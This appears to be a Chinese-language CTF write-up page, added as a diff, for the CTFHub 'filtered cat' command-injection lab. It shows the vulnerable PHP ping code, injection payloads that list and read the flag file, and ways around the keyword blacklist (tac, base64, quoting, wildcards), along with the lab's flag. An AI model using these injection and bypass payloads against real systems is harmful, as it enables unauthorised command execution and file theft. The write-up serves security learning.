@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-RCE 命令注入-过滤cat Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .note { background-color: #fff5b1; padding: 10px; border-left: 5px solid #f1c40f; margin: 15px 0; border-radius: 3px; font-size: 0.95em; }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 0.95em; }
+        th, td { border: 1px solid #dfe2e5; padding: 8px 12px; text-align: left; }
+        th { background-color: #f6f8fa; }
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-RCE 命令注入-过滤cat Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, RCE, 命令注入, 过滤cat, base64读取</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - RCE / 命令注入</li>
+        <li><strong>题目名称：</strong>过滤cat</li>
+        <li><strong>环境：</strong>浏览器 + 输入框提交。</li>
+        <li><strong>目标：</strong>在 cat 命令被正则黑名单过滤的情况下，使用替代命令读取目标文件。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>本关核心考点：</strong>命令注入黑名单绕过，以及 Web 环境下读取 PHP 源码的特殊处理。</p >
+    
+    <div class="diff-box">
+        <strong>知识点（比喻说明）：</strong>
+        <ul>
+            <li><strong>黑名单绕过：</strong> 服务器使用正则表达式 <code>preg_match_all("/cat/", ...)</code> 拦截了 cat 关键字。就像门口的保安不让叫“cat”的人进。我们可以派一个叫“tac”或“base64”的双胞胎兄弟进去，或者用易容术（如 ca?、c'a't）把 cat 伪装起来。</li>
+            <li><strong>Web 环境下的源码读取：</strong> 当文件内容包含 <code>&lt;?php // flag... ?&gt;</code> 时，如果直接用 <code>cat</code> 或 <code>tac</code> 读取，返回的 HTML 会被浏览器解析隐藏，导致回显为空。最佳做法是使用 <code>base64</code> 命令进行强制编码，得到纯文本字符串后再在本地解码。</li>
+        </ul>
+    </div>
+
+    <h2>3. 详细步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：源码审计与漏洞定位</h3>
+        <pre><code>&lt;?php
+if (isset($_GET['ip']) && $_GET['ip']) {
+    $ip = $_GET['ip'];
+    $m = [];
+    if (!preg_match_all("/cat/", $ip, $m)) {
+        $cmd = "ping -c 4 {$ip}";
+        exec($cmd, $res);
+    } else {
+        $res = $m;
+    }
+}
+?&gt;</code></pre>
+        <p class="info-line"><span class="info-label">代码逐行解析：</span></p >
+        <ul>
+            <li><code>preg_match_all("/cat/", $ip, $m)</code>：如果参数 <code>ip</code> 里包含连续的 <code>cat</code> 字符串，则拦截并打印匹配结果。</li>
+            <li>命令注入逻辑与之前相同，只是在拼接执行前增加了一道关键字检查。</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：探测目标文件</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>127.0.0.1; ls -la</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span>发现目标文件 <code>flag_1323198513494.php</code>，文件大小 42 字节。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：尝试 tac 绕过（排错过程）</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>127.0.0.1; tac flag_1323198513494.php</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">操作解析：</span> <code>tac</code> 是 <code>cat</code> 的反写，不包含 cat 字符串，可以成功绕过正则检测。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>数组 <code>[9]</code> 处为空（<code>[9] =></code>）。推测是因为文件内容为 <code>&lt;?php // ctfhub{...}</code>，被 PHP 解析器或 HTML 渲染器“吃掉”了。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：使用 base64 强制读取并解码 Flag</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>127.0.0.1; base64 flag_1323198513494.php</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span>得到 Base64 字符串 <code>PD9waHAgLy8gY3RmaHViezZhNWFkYzQyNjhhYjEyNGRmMTkwYjRkMX0K</code></p >
+        <p class="info-line"><span class="info-label">操作：</span> 将字符串复制到在线工具 <a href="https://base64.us" target="_blank">https://base64.us</a> 进行解码。</p >
+        <p class="info-line"><span class="info-label">解码结果：</span><code>&lt;?php // ctfhub{6a5adc4269ab124df190b4d1}</code></p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘（逻辑推导）</h2>
+    <ul>
+        <li><b>黑名单只过滤了字面量：</b> 正则 <code>/cat/</code> 只能匹配连续的 "cat" 字符串。使用 <code>tac</code> 或 <code>base64</code> 即可轻松绕过。</li>
+        <li><b>Web 渲染干扰：</b> 单纯使用 <code>tac</code> 读取 PHP 源码会得到一片空白（因为 PHP 标签和 HTML 语法会被解析）。必须牢记使用 <code>base64</code> 强制转码。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>读文件命令替代库：</strong> 当 <code>cat</code> 被禁用时，可选择 <code>tac</code>、<code>nl</code>、<code>more</code>、<code>less</code>、<code>head</code>、<code>tail</code>、<code>sort</code>、<code>base64</code>、<code>xxd</code> 等。</li>
+        <li><strong>Web 环境读源码的最佳实践：</strong> 优先使用 <code>base64</code> 编码读取，再本地解码，可以完美解决一切 HTML 标签和 PHP 代码解析带来的视觉干扰。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
